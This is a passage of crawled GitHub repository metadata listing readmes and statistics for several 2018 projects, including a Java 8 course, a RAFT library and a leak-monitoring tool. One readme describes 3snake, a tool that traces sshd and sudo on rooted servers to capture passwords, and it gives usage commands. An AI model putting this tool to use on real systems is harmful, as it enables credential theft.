on zhihu](https://img.shields.io/badge/zhihu-%40biezhi-red.svg)](https://www.zhihu.com/people/biezhi)\n[![](https://img.shields.io/github/followers/biezhi.svg?style=social&label=Follow%20Me)](https://github.com/biezhi)\n\n课程的讲授方式原则是：**What**、**Why**、**How**\n\n我们会说清楚每个技能是什么，为什么是这样，以及编码演示他们的使用方法以及场景，\n最后会讲解 Java 8 中的最佳实践以及正确的函数式编程姿势。\n\n## 课程大纲\n\n| 课时数 | 课时标题 | 在线播放 | 源码位置 | \n|:-----:|:--------|:-------|:-------|\n|第 1 课 | [课程介绍](https://github.com/biezhi/learn-java8) | [哔哩哔哩](https://www.bilibili.com/video/av19287893/index_1.html#page=1) &brvbar; [Youtube](https://youtu.be/A733pQxiEDk) | 无 |\n|第 2 课 | [Java 8 的发展](https://github.com/biezhi/learn-java8/blob/master/java8-growing/README.md) | [哔哩哔哩](https://www.bilibili.com/video/av19287893/index_2.html#page=2) &brvbar; [Youtube](https://youtu.be/fHhgm1AZzhs) | [java8-growing](https://github.com/biezhi/learn-java8/tree/master/java8-growing/src/main/java/io/github/biezhi/java8/growing) |\n|第 3 课 | [理解 lambda](https://github.com/biezhi/learn-java8/blob/master/java8-lambda/README.md) | [哔哩哔哩](https://www.bilibili.com/video/av19287893/index_3.html#page=3) &brvbar; [Youtube](https://youtu.be/VkdMeFEGDH8) | [lambda1](https://github.com/biezhi/learn-java8/tree/master/java8-lambda/src/main/java/io/github/biezhi/java8/lambda/lesson1) |\n|第 4 课 | [初尝 lambda](https://github.com/biezhi/learn-java8/blob/master/java8-lambda/README.md) | [哔哩哔哩](https://www.bilibili.com/video/av19287893/index_4.html#page=4) &brvbar; [Youtube](https://youtu.be/X7Zv5vygjTc) | [lambda2](https://github.com/biezhi/learn-java8/tree/master/java8-lambda/src/main/java/io/github/biezhi/java8/lambda/lesson2) |\n|第 5 课 | [lambda 进阶](https://github.com/biezhi/learn-java8/blob/master/java8-lambda/README.md) | [哔哩哔哩](https://www.bilibili.com/video/av19287893/index_5.html#page=5) &brvbar; [Youtube](https://youtu.be/3G83it4IASc) | [lambda3](https://github.com/biezhi/learn-java8/tree/master/java8-lambda/src/main/java/io/github/biezhi/java8/lambda/lesson3) |\n|第 6 课 | [默认方法的妙用](https://github.com/biezhi/learn-java8/blob/master/java8-default-methods/README.md) | [哔哩哔哩](https://www.bilibili.com/video/av19287893/index_6.html#page=6) &brvbar; [Youtube](https://youtu.be/sAuEnkWezDM) | [default-method](https://github.com/biezhi/learn-java8/tree/master/java8-default-methods/src/main/java/io/github/biezhi/java8/defaultmethods) |\n|第 7 课 | [干掉空指针之 Optional](https://github.com/biezhi/learn-java8/blob/master/java8-optional/README.md) | [哔哩哔哩](https://www.bilibili.com/video/av19287893/index_7.html#page=7) &brvbar; [Youtube](https://youtu.be/br4kqCXPB9A) | [optional](https://github.com/biezhi/learn-java8/tree/master/java8-default-methods/src/main/java/io/github/biezhi/java8/optional) |\n|第 8 课 | 理解 Stream | 哔哩哔哩 &brvbar; Youtube | |\n|第 9 课 | Stream API（上）| 哔哩哔哩 &brvbar; Youtube | |\n|第 10 课 | Stream API（下）| 哔哩哔哩 &brvbar; Youtube | |\n|第 11 课 | 新的日期时间 API | 哔哩哔哩 &brvbar; Youtube | |\n|第 12 课 | 并发增强 | 哔哩哔哩 &brvbar; Youtube | |\n|第 13 课 | CompletableFuture | 哔哩哔哩 &brvbar; Youtube | |\n|第 14 课 | Nashorn 引擎 | 哔哩哔哩 &brvbar; Youtube | |\n|第 15 课| Java 8 最佳实践 | 哔哩哔哩 &brvbar; Youtube | |\n|第 16 课| 函数式编程的正确姿势 | 哔哩哔哩 &brvbar; Youtube | |\n\n> 💡 点击课时标题即可查看课程大纲\n> \n> 💊 建议课程食用方式: x1.25倍速效果更佳\n\n## 相关资源\n\n- 本套课程的所有源码存储在 [Github](https://github.com/biezhi/learn-java8) 上\n- 欢迎关注知乎专栏 [《跟上 Java 8》](https://zhuanlan.zhihu.com/java8) 学习更多优质内容\n\n## 交流\n\n在学习 Java8 过程中有疑问可以在QQ群：**663887729** 交流或者在视频的评论区留言。\n你也可以在 Github 上发起一个 [issue](https://github.com/biezhi/learn-java8/issues/new) 提问。\n\n## 捐赠作者\n\n我们提供的所有视频和源码都是免费的，如果你在这个过程中学习到了技能可以扫描下方二维码赞赏作者。\n\n<img src=\"https://i.imgur.com/4mr92X1.png\" width=\"580\"/>\n\n## 授权许可\n\n除特别声明外，本套教程中的内容使用 [CC BY-SA 3.0 License](https://creativecommons.org/licenses/by-sa/3.0/deed.zh)（创作共用 署名-相同方式共享 3.0 许可协议）授权，\n代码遵循 [BSD 3-Clause](https://opensource.org/licenses/BSD-3-Clause) License（3 项条款的 BSD 许可协议）。\n","byteSize":5382},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":121},"createdAt":"2018-02-07T05:57:32Z","updatedAt":"2018-02-17T08:09:33Z","pushedAt":"2018-02-12T08:11:19Z","description":"💖《跟上 Java 8》视频课程源码，每日更新，请勿 fork。","subscribersCount":{"totalCount":15},"diskUsage":106,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":43}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"hanford","followers":{"totalCount":75},"repositories":{"totalCount":147},"following":{"totalCount":46},"location":"San Francisco, CA","organizations":{"totalCount":3},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":14},"websiteUrl":"http://jackhanford.com/"},"repository":{"name":"next-offline","primaryLanguage":{"name":"JavaScript"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":4,"readme_md":null,"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":154},"createdAt":"2018-02-07T18:33:43Z","updatedAt":"2018-02-16T11:26:41Z","pushedAt":"2018-02-16T19:07:38Z","description":"make your Next.js application work offline using service workers via Google's workbox","subscribersCount":{"totalCount":2},"diskUsage":173,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":2},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":3},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":34}}},"tags":{"totalCount":9},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"brpc","repositories":{"totalCount":2},"location":null,"members":{"totalCount":3},"websiteUrl":null},"repository":{"name":"braft","primaryLanguage":{"name":"C++"},"license":"Apache License 2.0","isArchived":false,"hasWikiEnabled":true,"forkCount":22,"readme_md":{"text":"[![Build Status](https://travis-ci.org/brpc/braft.svg?branch=master)](https://travis-ci.org/brpc/braft)\n\n---\n\nAn industrial-grade C++ implementation of [RAFT consensus algorithm](https://raft.github.io/) and [replicated state machine](https://en.wikipedia.org/wiki/State_machine_replication) based on [brpc](https://github.com/brpc/brpc). braft is designed and implemented for scenarios demanding for high workload and low overhead of latency, with the consideration for easy-to-understand concepts so that engineers inside Baidu can build their own distributed systems individually and correctly.\n\nIt's widely used inside Baidu to build highly-available systems, such as:\n* Storage systems: Key-Value, Block, Object, File ...\n* SQL storages: HA MySQL cluster, distributed transactions, NewSQL systems ...\n* Meta services: Various master modules, Lock services ...\n\n# Getting Started\n\n* Build [brpc](https://github.com/brpc/brpc/blob/master/docs/cn/getting_started.md) which is the main dependency of braft.\n\n* Compile braft with cmake\n\n  ```shell\n  $ mkdir build && cd build && cmake .. && make\n  ```\n\n* Play braft with [examples](./example).\n\n# Docs\n\n* Read [overview](./docs/cn/overview.md) to know what you can do with braft.\n* Read [benchmark](./docs/cn/benchmark.md) to have a quick view about performance of braft\n* [Build Service based on braft](./docs/cn/server.md)\n* [Access Service based on braft](./docs/cn/client.md)\n* [Cli tools](./docs/cn/cli.md)\n* [Replication Model](./docs/cn/replication.md)\n* Consensus protocol:\n  * [RAFT](./docs/cn/raft_protocol.md)\n  * [Paxos](./docs/cn/paxos_protocol.md)\n  * [ZAB](./docs/cn/zab_protocol.md)\n  * [QJM](./docs/cn/qjm.md)\n\n","byteSize":1678},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":219},"createdAt":"2018-02-07T11:25:57Z","updatedAt":"2018-02-17T06:28:12Z","pushedAt":"2018-02-13T09:35:30Z","description":"An industrial-grade C++ implementation of RAFT consensus algorithm based on brpc,  widely used inside Baidu to build highly-available distributed systems.","subscribersCount":{"totalCount":17},"diskUsage":4808,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":2},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":22}}}]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":370}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"blendin","followers":{"totalCount":498},"repositories":{"totalCount":8},"following":{"totalCount":37},"location":null,"organizations":{"totalCount":1},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":1},"websiteUrl":"https://tiszka.com"},"repository":{"name":"3snake","primaryLanguage":{"name":"C"},"license":"Other","isArchived":false,"hasWikiEnabled":true,"forkCount":29,"readme_md":{"text":"3snake - dump sshd and sudo credential related strings\n---\n\nAbout\n---\nTargeting rooted servers, reads memory from `sshd` and `sudo` system calls that handle password based authentication. Doesn't write any memory to the traced processes. Spawns a new process for every `sshd` and `sudo` command that is run.\n\nListens for the `proc` event using netlink sockets to get candidate processes to trace. When it receives an `sshd` or `sudo` process `ptrace` is attached and traces `read` and `write` system calls, extracting strings related to password based authentication.\n\nDon't really like the solution of backdooring openssh or installing a kernel module on target servers so I made this.\n\n![3snake](https://user-images.githubusercontent.com/20363764/35941544-74b2d22c-0c07-11e8-887a-474cb9b6daec.gif)\n\n\n\n\n\n\n\n\n\n\n\n\nBuild\n---\n```sh\nmake\n./3snake -h\n./3snake\n```\n\n\n\n\n\nUsage\n---\n\nRun in current terminal\n`./3snake`\n\nRun in current terminal and dump output to file\n`./3snake -o \"output_file.txt\"`\n\nDaemonize and dump output to file\n`./3snake -d -o \"output_file.txt\"`\n\nLimitations\n---\nLinux, ptrace enabled, /proc filesystem mounted\n\n\nTodo\n---\n\n| Features                                          | X   |\n|---------------------------------------------------|-----|\n| OpenSSH server password auth                      | X   |\n| sudo                                              | X   |\n| su                                                | ~   |\n| regex strings from processes                      | ~   |\n| ssh client                                        | ~   |\n\n* Make the process of adding tracers more fluid\n* Yubikey: Ask for second yubikey from end users, OpenSSH\n* Output mode that only shows usernames/passwords\n\nLicense\n---\nMIT\n","byteSize":1731},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":224},"createdAt":"2018-02-07T21:03:15Z","updatedAt":"2018-02-17T06:28:27Z","pushedAt":"2018-02-15T21:49:12Z","description":"Tool for extracting information from newly spawned processes","subscribersCount":{"totalCount":14},"diskUsage":31,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":1},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}}]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":2},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":16}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"sindresorhus","followers":{"totalCount":22412},"repositories":{"totalCount":1248},"following":{"totalCount":45},"location":"° ☾ ☆ ¸. ¸　★  :.　 . • ○ ° ★","organizations":{"totalCount":24},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":10},"stargazers":{"totalCount":22}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":25}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":12}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":13},"stargazers":{"totalCount":7}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":11},"stargazers":{"totalCount":12}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":23}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":16}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":10},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":8},"stargazers":{"totalCount":51}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":4},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":8},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":14}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":7}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":4},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":7},"stargazers":{"totalCount":9}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":7}}},{"node":{"comments":{"totalCount":24},"stargazers":{"totalCount":424}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":29}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":9},"stargazers":{"totalCount":9}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":59}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":10}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":70},"websiteUrl":"https://sindresorhus.com"},"repository":{"name":"sass-extras","primaryLanguage":{"name":"CSS"},"license":"MIT License","isArchived":false,"hasWikiEnabled":false,"forkCount":0,"readme_md":null,"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":102},"createdAt":"2018-02-06T08:59:26Z","updatedAt":"2018-02-17T00:28:28Z","pushedAt":"2018-02-12T18:55:55Z","description":"Useful utilities for working with Sass","subscribersCount":{"totalCount":5},"diskUsage":92,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":8}}},"tags":{"totalCount":3},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"feross","followers":{"totalCount":6934},"repositories":{"totalCount":184},"following":{"totalCount":212},"location":"San Francisco, CA","organizations":{"totalCount":15},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":4},"stargazers":{"totalCount":11}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":28}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":10}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":16},"websiteUrl":"https://feross.org"},"repository":{"name":"thanks","primaryLanguage":{"name":"JavaScript"},"license":null,"isArchived":false,"hasWikiEnabled":false,"forkCount":72,"readme_md":{"text":"# thanks [![travis][travis-image]][travis-url] [![npm][npm-image]][npm-url] [![downloads][downloads-image]][downloads-url] [![javascript style guide][standard-image]][standard-url]\n\n[travis-image]: https://img.shields.io/travis/feross/thanks/master.svg\n[travis-url]: https://travis-ci.org/feross/thanks\n[npm-image]: https://img.shields.io/npm/v/thanks.svg\n[npm-url]: https://npmjs.org/package/thanks\n[downloads-image]: https://img.shields.io/npm/dm/thanks.svg\n[downloads-url]: https://npmjs.org/package/thanks\n[standard-image]: https://img.shields.io/badge/code_style-standard-brightgreen.svg\n[standard-url]: https://standardjs.com\n\n### 🙌 Give thanks to the open source maintainers you depend on! ✨\n\n![example gif](img/example.gif)\n\n> \"Put your money where your love is.\"\n> – The Grateful Dead\n\nOpen source maintainers do the work that makes our awesome apps, websites, and projects possible! Many authors devote countless hours to open source. Let's help out authors and make the software we rely on healthier at the same time!\n\n[Vote for us on Product Hunt](https://www.producthunt.com/posts/thanks) ❤️\n\n## Usage\n\nIt's easy!\n\n1. Run `npx thanks` in your project\n2. See which of your dependencies are seeking donations! 💸\n\n## Install\n\nRun it instantly (without installing!) using:\n\n```js\nnpx thanks\n```\n\nOr, install it, then run it:\n\n```js\nnpm install -g thanks\nthanks\n```\n\n## 🌟 Open source authors, add yourself to the list\n\nIf you're an open source author who accepts donations, add yourself to the `thanks` CLI by [modifying this file](https://github.com/feross/thanks/blob/master/index.js), and sending a pull request!\n\nWe're also considering [supporting a new `package.json` field](https://github.com/feross/thanks/issues/2). Please share your thoughts!\n\n## License\n\nMIT. Copyright (c) [Feross Aboukhadijeh](https://feross.org).\n","byteSize":1852},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":1495},"createdAt":"2018-02-07T06:48:13Z","updatedAt":"2018-02-17T06:58:00Z","pushedAt":"2018-02-16T21:05:33Z","description":"🙌 Give thanks to the open source maintainers you depend on! ✨","subscribersCount":{"totalCount":14},"diskUsage":203,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":6},"pullRequestsMerged":{"totalCount":46},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":6},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":4},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":5}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":6},"issuesClosed":{"totalCount":11},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":21},"participants":{"totalCount":12}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":172}}},"tags":{"totalCount":20},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"MiSecurity","repositories":{"totalCount":1},"location":"Beijing, China","members":{"totalCount":0},"websiteUrl":""},"repository":{"name":"x-patrol","primaryLanguage":{"name":"HTML"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":51,"readme_md":{"text":"## Github leaked patrol\n\nGithub leaked patrol为一款github泄露巡航工具：\n\n1. 提供了WEB管理端，后台数据库支持SQLITE3、MYSQL和POSTGRES\n1. 双引擎搜索，github code接口搜索全局github以及本地搜索例行监控的repos\n1. 